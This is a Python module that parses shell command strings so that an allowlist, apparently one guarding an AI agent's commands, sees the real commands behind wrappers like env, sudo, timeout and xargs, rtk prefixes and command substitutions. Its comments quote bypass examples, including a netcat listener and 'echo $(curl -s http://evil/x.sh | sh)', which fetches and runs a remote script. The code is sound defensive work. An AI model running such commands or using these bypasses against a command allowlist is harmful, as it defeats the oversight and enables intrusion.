"""
Command Parsing Utilities
==========================

Functions for parsing and extracting commands from shell command strings.
Handles compound commands, pipes, subshells, and various shell constructs.

Windows Compatibility Note:
--------------------------
On Windows, commands containing paths with backslashes can cause shlex.split()
to fail (e.g., incomplete commands with unclosed quotes). This module includes
a fallback parser that extracts command names even from malformed commands,
ensuring security validation can still proceed.
"""

import re
import shlex
from pathlib import PurePosixPath, PureWindowsPath


def _cross_platform_basename(path: str) -> str:
    """
    Extract the basename from a path in a cross-platform way.

    Handles both Windows paths (C:\\dir\\cmd.exe) and POSIX paths (/dir/cmd)
    regardless of the current platform. This is critical for running tests
    on Linux CI while handling Windows-style paths.

    Args:
        path: A file path string (Windows or POSIX format)

    Returns:
        The basename of the path (e.g., "python.exe" from "C:\\Python312\\python.exe")
    """
    # Strip surrounding quotes if present
    path = path.strip("'\"")

    # Check if this looks like a Windows path (contains backslash or drive letter)
    if "\\" in path or (len(path) >= 2 and path[1] == ":"):
        # Use PureWindowsPath to handle Windows paths on any platform
        return PureWindowsPath(path).name

    # For POSIX paths or simple command names, use PurePosixPath
    # (os.path.basename works but PurePosixPath is more explicit)
    name = PurePosixPath(path).name

    # `.` and `..` have no basename, and `.` is a command: the other spelling
    # of `source`. Returning "" for it put an empty name in front of the
    # allowlist, which refused it with a message naming nothing — and hid it
    # from the `.` validator, which is the one with something to say.
    return name or path


def _fallback_extract_commands(command_string: str) -> list[str]:
    """
    Fallback command extraction when shlex.split() fails.

    Uses regex to extract command names from potentially malformed commands.
    This is more permissive than shlex but ensures we can at least identify
    the commands being executed for security validation.

    Args:
        command_string: The command string to parse

    Returns:
        List of command names extracted from the string
    """
    commands = []

    # First, split by common shell operators
    # This regex splits on &&, ||, |, ; while being careful about quotes
    # We're being permissive here since shlex already failed
    parts = re.split(r"\s*(?:&&|\|\||\|)\s*|;\s*", command_string)

    for part in parts:
        part = part.strip()
        if not part:
            continue

        # Tokenize the WHOLE part, not just its head. A wrapper puts the
        # command that matters after its own arguments, and a fallback that
        # stopped at the first token would be the bypass `_scan_tokens` exists
        # to close — reachable on Windows, where this parser is the one that
        # runs.
        tokens = [
            match.group(1) or match.group(2) or match.group(3)
            for match in re.finditer(r'"([^"]*)"|\'([^\']*)\'|(\S+)', part)
        ]
        if not tokens:
            continue

        for cmd in _scan_tokens(tokens):
            # Remove Windows extensions
            cmd = re.sub(r"\.(exe|cmd|bat|ps1|sh)$", "", cmd, flags=re.IGNORECASE)

            # Clean up any remaining quotes or special chars at the start
            cmd = re.sub(r'^["\'\\/]+', "", cmd)

            # Skip tokens that look like function calls or code fragments (not
            # shell commands). These appear when splitting on semicolons inside
            # malformed quoted strings.
            if "(" in cmd or ")" in cmd or "." in cmd:
                continue

            if cmd:
                commands.append(cmd)

    return commands


def split_command_segments(command_string: str) -> list[str]:
    """
    Split a compound command into individual command segments.

    Handles command chaining (&&, ||, ;) but not pipes (those are single commands).
    """
    # Split on && and || while preserving the ability to handle each segment
    segments = re.split(r"\s*(?:&&|\|\|)\s*", command_string)

    # Further split on semicolons
    result = []
    for segment in segments:
        sub_segments = re.split(r'(?<!["\'\\])\s*;\s*(?!["\'])', segment)
        for sub in sub_segments:
            sub = sub.strip()
            if sub:
                result.append(sub)

    return result


def _contains_windows_path(command_string: str) -> bool:
    """
    Check if a command string contains Windows-style paths.

    Windows paths with backslashes cause issues with shlex.split() because
    backslashes are interpreted as escape characters in POSIX mode.

    Args:
        command_string: The command string to check

    Returns:
        True if Windows paths are detected
    """
    # Pattern matches:
    # - Drive letter paths: C:\, D:\, etc.
    # - Backslash followed by a path component (2+ chars to avoid escape sequences like \n, \t)
    #   The second char must be alphanumeric, underscore, or another path separator
    #   This avoids false positives on escape sequences which are single-char after backslash
    return bool(re.search(r"[A-Za-z]:\\|\\[A-Za-z][A-Za-z0-9_\\/]", command_string))


def unwrap_rtk_prefixes(command_string: str) -> str:
    """Replace every `rtk <command>` in a command line by `<command>`.

    rtk is a proxy: it runs the command it was given and filters the output.
    When its table has no entry for that command it runs it anyway
    (`run_fallback` in rtk's own `main.rs`), so `rtk <anything>` executes
    `<anything>` — and a validator that read the command name as "rtk" and
    stopped would be treating one allowlisted word as a door to every binary
    on the machine.

    So the allowlist never sees `rtk`: it sees what rtk will run. The rewrite
    is applied segment by segment, because a command line is `rtk pytest &&
    rtk ruff check` as often as it is one command, and because rtk's own meta
    commands (`rtk gain`, `rtk discover`) proxy nothing and must stay spelled
    `rtk`.
    """
    if "rtk" not in command_string:
        return command_string
    try:
        from rtk.rewrite import unwrap_rtk
    except Exception:  # noqa: BLE001 - validation must not depend on an optional module
        return command_string

    # Split on the operators that separate commands, keeping the separators
    # (the odd-indexed parts) so the line goes back together exactly as it was.
    parts = re.split(r"(\s*(?:\|\||&&|\||;)\s*)", command_string)
    rebuilt: list[str] = []
    for index, part in enumerate(parts):
        if index % 2:
            rebuilt.append(part)
            continue
        stripped = part.strip()
        if not stripped:
            rebuilt.append(part)
            continue
        start = part.index(stripped[0])
        rebuilt.append(
            part[:start] + unwrap_rtk(stripped) + part[start + len(stripped) :]
        )
    return "".join(rebuilt)


#: Commands that run another command given as their own argument.
#:
#: `extract_commands` used to record the first token of a segment and stop:
#: `expect_command` went False and only an operator (`|`, `&&`, `;`) turned it
#: back on. So `env FOO=1 nc -l 4444` reached the allowlist as `env`, and
#: `timeout 5 nc -l 4444` as `timeout` — one allowlisted word standing in front
#: of every binary on the machine, which is the exact failure
#: `unwrap_rtk_prefixes` was written to prevent for `rtk`. The class is simply
#: wider than rtk.
#:
#: The value is the set of options that consume the **following** token, so the
#: scan knows `-u PATH` is two tokens of `env` and not a command called `PATH`.
#: Getting that set wrong costs a false block, never a false pass: an
#: unrecognised option leaves the scan pointing at the option's value, which is
#: not an allowlisted command name.
TRANSPARENT_WRAPPERS: dict[str, frozenset[str]] = {
    "env": frozenset({"-u", "--unset", "-C", "--chdir", "-S", "--split-string"}),
    "nohup": frozenset(),
    "setsid": frozenset({"-w"}),
    "nice": frozenset({"-n", "--adjustment"}),
    "ionice": frozenset({"-c", "--class", "-n", "--classdata", "-p", "--pid"}),
    "stdbuf": frozenset({"-i", "--input", "-o", "--output", "-e", "--error"}),
    "timeout": frozenset({"-s", "--signal", "-k", "--kill-after"}),
    "watch": frozenset({"-n", "--interval", "-d", "--differences"}),
    "time": frozenset({"-f", "--format", "-o", "--output"}),
    "command": frozenset(),
    "builtin": frozenset(),
    "exec": frozenset({"-a"}),
    "xargs": frozenset(
        {
            "-I",
            "-i",
            "-n",
            "-P",
            "-L",
            "-d",
            "-E",
            "-s",
            "-a",
            "--replace",
            "--max-args",
            "--max-procs",
            "--max-lines",
            "--delimiter",
            "--arg-file",
            "--eof",
            "--max-chars",
        }
    ),
    "sudo": frozenset({"-u", "--user", "-g", "--group", "-p", "--prompt", "-C", "-U"}),
    "doas": frozenset({"-u", "-C"}),
}

#: Tokens a wrapper takes positionally *before* the command it runs.
#: `timeout 5 cmd` is the only common one; naming it beats a "looks numeric"
#: heuristic, which would also swallow a first argument that mattered.
_WRAPPER_POSITIONALS: dict[str, int] = {"timeout": 1}

#: The shell constructs that open a command line inside another one.
#: `shell_validators` has refused these inside `bash -c` since it was written;
#: at the top level nothing looked for them at all, so
#: `echo $(curl -s http://evil/x.sh | sh)` reached the allowlist as `echo`.
_SUBSTITUTION_OPENERS: tuple[tuple[str, str], ...] = (
    ("$(", ")"),
    ("<(", ")"),
    (">(", ")"),
)


def extract_substitutions(command_string: str) -> list[str]:
    """Return the command lines hidden inside `$(...)`, backticks and `<(...)`.

    Nesting is followed one layer at a time: the inner text of `$(echo $(id))`
    comes back whole, and a caller validating it recursively meets `$(id)` on
    the next round.

    Quoting is not honoured, on purpose. `"$(id)"` substitutes exactly like
    `$(id)`, so a scan that skipped quoted regions would miss the common case.
    A single-quoted `'$(id)'` does not substitute, so reporting it is a false
    block — that is the direction worth erring in, and an agent that means the
    literal has `printf` and the `\\$` escape.

    `$((...))` is arithmetic expansion. Nothing runs in it, and it is skipped.
    """
    found: list[str] = []
    index = 0
    length = len(command_string)

    while index < length:
        char = command_string[index]

        if char == "\\":
            index += 2
            continue

        if char == "`":
            end = index + 1
            while end < length:
                if command_string[end] == "\\":
                    end += 2
                    continue
                if command_string[end] == "`":
                    break
                end += 1
            if end < length:
                inner = command_string[index + 1 : end]
                if inner.strip():
                    found.append(inner)
                index = end + 1
                continue
            index += 1
            continue

        opener = next(
            (
                pair[0]
                for pair in _SUBSTITUTION_OPENERS
                if command_string.startswith(pair[0], index)
            ),
            None,
        )
        if opener is None:
            index += 1
            continue

        if command_string.startswith("$((", index):
            index += 3
            continue

        depth = 1
        cursor = index + len(opener)
        while cursor < length and depth:
            if command_string[cursor] == "\\":
                cursor += 2
                continue
            if command_string[cursor] == "(":
                depth += 1
            elif command_string[cursor] == ")":
                depth -= 1
            cursor += 1

        closed = depth == 0
        inner = command_string[index + len(opener) : (cursor - 1) if closed else length]
        if inner.strip():
            found.append(inner)
        index = cursor if closed else length

    return found


_SHELL_KEYWORDS: frozenset[str] = frozenset(
    {
        "if",
        "then",
        "else",
        "elif",
        "fi",
        "for",
        "while",
        "until",
        "do",
        "done",
        "case",
        "esac",
        "in",
        "!",
        "{",
        "}",
        "(",
        ")",
        "function",
    }
)

#: Redirections that are followed by their target. `2>&1` names its target in
#: the same token and so is not here — skipping the token after it would eat a
#: command.
_REDIRECTS_WITH_TARGET: frozenset[str] = frozenset(
    {"<<", "<<<", ">>", ">", "<", "2>", "2>>", "&>", "&>>"}
)


def _scan_tokens(tokens: list[str]) -> list[str]:
    """Record every token in `tokens` that a shell would run as a command.

    One token per pipeline stage used to be the whole of it. This walks the
    stage as well, because a transparent wrapper (`env`, `timeout`, `sudo`,
    `xargs`…) puts the command that matters *after* its own arguments — see
    `TRANSPARENT_WRAPPERS`.

    The wrapper itself is still recorded. It has to be: the allowlist decides
    whether `sudo` may be run at all, and that question is not answered by
    what follows it.
    """
    commands: list[str] = []
    expect_command = True
    # Set while the scan is walking a wrapper's own arguments.
    wrapper_options: frozenset[str] = frozenset()
    positionals_left = 0
    skip_next = False

    for token in tokens:
        if skip_next:
            skip_next = False
            continue

        # Shell operators indicate a new command follows
        if token in ("|", "||", "&&", "&"):
            expect_command = True
            wrapper_options = frozenset()
            positionals_left = 0
            continue

        if token in _SHELL_KEYWORDS:
            continue

        # A wrapper option that consumes the next token — checked before the
        # generic flag skip below, which is what tells `env -u PATH nc` from a
        # command named `PATH`.
        if expect_command and token in wrapper_options:
            skip_next = True
            continue

        # Skip flags/options
        if token.startswith("-"):
            continue

        # Skip variable assignments (VAR=value)
        if "=" in token and not token.startswith("="):
            continue

        if token in _REDIRECTS_WITH_TARGET:
            # The target is a path, never a command. Skipping it matters only
            # while a command is still expected (`exec > log`), but skipping it
            # always keeps the two cases from having to be told apart.
            skip_next = True
            continue

        if token == "2>&1":
            continue

        if not expect_command:
            continue

        if positionals_left:
            positionals_left -= 1
            continue

        # Extract the base command name (handle paths like /usr/bin/python)
        # Use cross-platform basename for Windows paths on Linux CI
        cmd = _cross_platform_basename(token)
        commands.append(cmd)

        wrapper_options = TRANSPARENT_WRAPPERS.get(cmd, frozenset())
        if cmd in TRANSPARENT_WRAPPERS:
            # Keep expecting: the command this one runs is still ahead.
            positionals_left = _WRAPPER_POSITIONALS.get(cmd, 0)
        else:
            expect_command = False
            positionals_left = 0

    return commands


def extract_commands(command_string: str) -> list[str]:
    """
    Extract command names from a shell command string.

    Handles pipes, command chaining (&&, ||, ;), and subshells.
    Returns the base command names (without paths).

    Commands wrapped by rtk are validated as the command rtk will run, never
    as "rtk" — see `unwrap_rtk_prefixes`.

    On Windows or when commands contain malformed quoting (common with
    Windows paths in bash-style commands), falls back to regex-based
    extraction to ensure security validation can proceed.
    """
    command_string = unwrap_rtk_prefixes(command_string)
    # If command contains Windows paths, use fallback parser directly
    # because shlex.split() interprets backslashes as escape characters
    if _contains_windows_path(command_string):
        fallback_commands = _fallback_extract_commands(command_string)
        if fallback_commands:
            return fallback_commands
        # Continue with shlex if fallback found nothing

    commands = []

    # Split on semicolons that aren't inside quotes
    segments = re.split(r'(?<!["\'\\])\s*;\s*(?!["\'])', command_string)

    for segment in segments:
        segment = segment.strip()
        if not segment:
            continue

        try:
            tokens = shlex.split(segment)
        except ValueError:
            # Malformed command (unclosed quotes, etc.)
            # This is common on Windows with backslash paths in quoted strings
            # Use fallback parser instead of blocking
            fallback_commands = _fallback_extract_commands(command_string)
            if fallback_commands:
                return fallback_commands
            # If fallback also found nothing, return empty to trigger block
            return []

        if not tokens:
            continue

        commands.extend(_scan_tokens(tokens))

    return commands


def get_command_for_validation(cmd: str, segments: list[str]) -> str:
    """
    Find the specific command segment that contains the given command.

    The segment is returned **unwrapped**: the deep validators parse it
    themselves, and every one of them starts by checking that the first token
    is the tool it guards (`tokens[0] != "git"` → nothing to say). Handed
    `rtk git commit`, they would all answer "not mine" and the commit would
    reach the repository without its secret scan. The command rtk runs is the
    command that has to be judged.
    """
    for segment in segments:
        segment_commands = extract_commands(segment)
        if cmd in segment_commands:
            return unwrap_rtk_prefixes(segment)
    return ""
